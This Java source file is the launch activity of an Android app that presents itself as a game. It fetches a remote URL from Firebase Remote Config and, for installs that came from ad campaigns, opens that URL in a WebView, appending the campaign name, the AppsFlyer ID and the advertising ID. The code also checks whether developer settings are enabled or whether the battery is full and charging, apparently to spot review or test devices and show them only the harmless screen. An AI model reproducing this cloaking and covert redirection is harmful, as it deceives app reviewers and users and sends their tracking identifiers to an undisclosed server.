package com.army.spacear;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.BatteryManager;
import android.os.Bundle;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.util.Map;

public class GifActivity extends AppCompatActivity implements SaveInterface{

    private static final String AF_DEV_KEY = "55cZ5t6haW6R65hVg47MwD";
    private static final String ONESIGNAL_APP_ID = "bc1d7fc4-3c35-440f-9a1c-ecb99eaa8fba";

    private boolean charging = false;
    SharedPreferences sharedPreferences;

    private final String key1 = "key1";
    private final String key2 = "key2";
    private final String key3 = "key3";
    private final String key4 = "key4";

    private String gameUrlForWebView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_gif);

        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        sharedPreferences = getSharedPreferences("PREFFERENCES", MODE_PRIVATE);

        if(!isFirstGame()) {
            if (!getGameUrl().isEmpty()) {
                startActivity(new Intent(GifActivity.this, GameActivity.class));
                finish();
            } else {
                startActivity(new Intent(GifActivity.this, MainActivity.class));
                finish();
            }
        } else{
                if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null) {
                    startActivity(new Intent(GifActivity.this, MainActivity.class));
                    finish();
                } else {
                    AppsFlyerLib.getInstance().init(AF_DEV_KEY, new AppsFlyerConversionListener() {
                        @Override
                        public void onConversionDataSuccess(Map<String, Object> conversionData) {
                            if (isFirstAppsFlyer()) {
                                FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                                        .setMinimumFetchIntervalInSeconds(3600)
                                        .build();
                                firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                                firebaseRemoteConfig.fetchAndActivate()
                                        .addOnCompleteListener(GifActivity.this, new OnCompleteListener<Boolean>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Boolean> task) {
                                                try {
                                                    String str = firebaseRemoteConfig.getValue("Config").asString();
                                                    JSONObject gameObject = new JSONObject(str);
                                                    JSONObject jsonObject = new JSONObject(conversionData);
                                                    if(jsonObject.optString("af_status").equals("Non-organic")) {
                                                        String campaign = jsonObject.optString("campaign");
                                                        if (campaign.isEmpty() || campaign.equals("null")) {
                                                            campaign = jsonObject.optString("c");
                                                        }
                                                        String[] splitsCampaign = campaign.split("_");
                                                        OneSignal.sendTag("user_id", splitsCampaign[2]);
                                                        gameUrlForWebView = gameObject.optString("remote") + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
                                                        setGameUrl(gameUrlForWebView);
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                        startActivity(new Intent(GifActivity.this, GameActivity.class));
                                                        finish();
                                                    }else if(jsonObject.optString("af_status").equals("Organic")){
                                                            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                                                            int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                                            isPhonePluggedIn();
                                                            if (((batLevel == 100 || batLevel == 90) && charging) || (android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                                                                    android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0)) {
                                                                gameUrlForWebView = "";
                                                                setGameUrl(gameUrlForWebView);
                                                                AppsFlyerLib.getInstance().unregisterConversionListener();
                                                                startActivity(new Intent(GifActivity.this, MainActivity.class));
                                                                finish();
                                                            } else {
                                                                gameUrlForWebView = gameObject.optString("remote") + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
                                                                setGameUrl(gameUrlForWebView);
                                                                AppsFlyerLib.getInstance().unregisterConversionListener();
                                                                startActivity(new Intent(GifActivity.this, GameActivity.class));
                                                                finish();
                                                            }
                                                    } else{
                                                        gameUrlForWebView = "";
                                                        setGameUrl(gameUrlForWebView);
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                        startActivity(new Intent(GifActivity.this, MainActivity.class));
                                                        finish();
                                                    }
                                                    setFirstAppsFlyer(false);
                                                    setFirstGame(false);
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                } catch (Exception ex) {
                                                }
                                            }
                                        });
                            }
                        }

                        @Override
                        public void onConversionDataFail(String errorMessage) {
                        }

                        @Override
                        public void onAppOpenAttribution(Map<String, String> attributionData) {
                        }

                        @Override
                        public void onAttributionFailure(String errorMessage) {
                        }
                    }, this);
                    AppsFlyerLib.getInstance().start(this);
                    AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
                }
        }
    }

    public void isPhonePluggedIn() {
        final Intent batteryIntent;
        batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        if (batteryCharge) {charging=true;}
        if (usbCharge) {charging=true;}
        if (acCharge) {charging=true;}
    }

    public boolean isFirstGame() {
        return sharedPreferences.getBoolean(key1, true);
    }

    public void setFirstGame(boolean firstGame) {
        sharedPreferences.edit().putBoolean(key1, firstGame).apply();
    }

    public boolean isFirstAppsFlyer() {
        return sharedPreferences.getBoolean(key2, true);
    }

    public void setFirstAppsFlyer(boolean firstAppsFlyer) {
        sharedPreferences.edit().putBoolean(key2, firstAppsFlyer).apply();
    }

    public boolean isFirstRef() {
        return sharedPreferences.getBoolean(key3, true);
    }

    public void setFirstRef(boolean firstRef) {
        sharedPreferences.edit().putBoolean(key3, firstRef).apply();
    }

    public String getGameUrl() {
        return sharedPreferences.getString(key4, "");
    }

    public void setGameUrl(String gameUrl) {
        sharedPreferences.edit().putString(key4, gameUrl).apply();
    }
    public String getMainUrl(){
        return gameUrlForWebView;
    }
}